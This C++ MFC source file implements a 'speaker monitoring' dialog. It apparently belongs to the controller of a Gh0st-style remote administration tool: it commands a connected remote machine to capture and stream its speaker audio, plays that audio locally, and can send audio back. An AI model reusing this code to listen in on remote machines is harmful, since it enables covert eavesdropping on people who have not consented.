// AudioDlg.cpp : 实现文件
//
#include "stdafx.h"
#include "Quick.h"
#include "SpeakerDlg.h"



// CSpeakerDlg 对话框



CSpeakerDlg* pCSpeakerDlg;
CSpeakerDlg::CSpeakerDlg(CWnd* pParent, ISocketBase* IOCPServer, ClientContext* ContextObject)
	: CDialog(CSpeakerDlg::IDD, pParent)
	, m_bSend(FALSE)
{
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_SPEAKER)); 
	m_iocpServer = IOCPServer;       
	m_pContext = ContextObject;
	m_nTotalRecvBytes = 0;
	m_nTotalSendBytes = 0;
	m_bOnClose = false;
	pCSpeakerDlg = this;
}


void CSpeakerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);

}


BEGIN_MESSAGE_MAP(CSpeakerDlg, CDialog)
	ON_BN_CLICKED(IDC_BUTTON_REMOTE_ON,OnBnClickedRrmoteOn)
	ON_BN_CLICKED(IDC_BUTTON_REMOTE_OFF, OnBnClickedRrmoteOff)
	ON_BN_CLICKED(IDC_BUTTON_SEND_ON,OnBnClickedSendOn)
	ON_BN_CLICKED(IDC_BUTTON_SEND_OFF,OnBnClickedSendOff)
END_MESSAGE_MAP()


// CSpeakerDlg 消息处理程序


BOOL CSpeakerDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	SetIcon(m_hIcon, FALSE);

	CString strString;
	strString.Format(_T("%s - 扬声器监听"), m_pContext->szAddress);
	SetWindowText(strString);
	//PostMessage(WM_COMMAND, MAKEWPARAM(IDC_BUTTON_REMOTE_ON, BN_CLICKED), NULL);
	return TRUE;  

}

void CSpeakerDlg::OnReceive()
{
	if (m_pContext == NULL)
		return;
	if (m_bOnClose) 	return;
	CString str;
	str.Format(_T("扬声器监听 \\\\ %s  [收包:%d 收:%d KB] [发包:%d 发:%d KB]"), m_pContext->szAddress, m_pContext->m_allpack_rev, int(m_pContext->m_alldata_rev / 1024), m_pContext->m_allpack_send, int(m_pContext->m_alldata_send / 1024));
	SetWindowText(str);
}


void CSpeakerDlg::OnReceiveComplete(void)
{
	if (m_bOnClose) 	return;

	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_SPEAK_DATA:
	{
		m_nTotalRecvBytes += ((LONGLONG)(m_pContext->m_DeCompressionBuffer.GetBufferLen()) - 1);   //1000+ =1000 1
		CString	strString;
		strString.Format(_T("数据接收 %d KBytes"), m_nTotalRecvBytes / 1024);
		SetDlgItemText(IDC_TIPS, strString);
		SetSpeakerDate.PlayBuffer(m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);   //播放波形数据
		break;
	}
	default:
		// 传输发生异常数据
		break;
	}
}



void CALLBACK CSpeakerDlg::SendData(byte* senddata, int datasize)
{
	senddata[0] = TOKEN_SPEAK_DATA;
	pCSpeakerDlg->m_iocpServer->Send(pCSpeakerDlg->m_pContext, senddata, datasize);
	(pCSpeakerDlg->m_nTotalSendBytes) += datasize;
	CString	strString;
	strString.Format(_T("数据发送 %d KBytes"),( pCSpeakerDlg->m_nTotalSendBytes) / 1024);
	pCSpeakerDlg->SetDlgItemText(IDC_TIPS_SEND, strString);
}

void CSpeakerDlg::OnCancel()
{
	if (m_bOnClose) return;
	m_bOnClose = TRUE;
	if (SetSpeakerDate.IsRendering())
	{
		SetSpeakerDate.Stop();
		SetSpeakerDate.Destroy();
	}
	if (GetSpeakerDate.IsCapturing())
	{
		GetSpeakerDate.Stop();
		GetSpeakerDate.Destroy();
	}
	CoUninitialize();
	m_iocpServer->Disconnect(m_pContext);
	DestroyIcon(m_hIcon);
	if (IsWindow(m_hWnd))
		DestroyWindow();
}



void CSpeakerDlg::PostNcDestroy()
{
	if (!m_bOnClose)
		OnCancel();
	CDialog::PostNcDestroy();
	delete this;
}

//监听
void CSpeakerDlg::OnBnClickedRrmoteOn()
{
	// TODO: 在此添加控件通知处理程序代码
	BYTE bToken = TOKEN_SPEAK_START;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
	CoInitialize(NULL);
	SetSpeakerDate.Initialize();
	SetSpeakerDate.Start();
}

//关闭监听
void CSpeakerDlg::OnBnClickedRrmoteOff()
{
	// TODO: 在此添加控件通知处理程序代码
	BYTE bToken = TOKEN_SPEAK_STOP;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
	if (SetSpeakerDate.IsRendering())
	{
		SetSpeakerDate.Stop();
		SetSpeakerDate.Destroy();
	}
	CoUninitialize();

}

//发送
void CSpeakerDlg::OnBnClickedSendOn()
{
	// TODO: 在此添加控件通知处理程序代码
	BYTE bToken = TOKEN_SEND_SPEAK_START;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
	CoInitialize(NULL);
	GetSpeakerDate.Initialize(SendData);
	GetSpeakerDate.Start();
}

//停止发送
void CSpeakerDlg::OnBnClickedSendOff()
{
	// TODO: 在此添加控件通知处理程序代码
	BYTE bToken = TOKEN_SEND_SPEAK_STOP;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
	if (GetSpeakerDate.IsCapturing())
	{
		GetSpeakerDate.Stop();
		GetSpeakerDate.Destroy();
	}
	CoUninitialize();
}

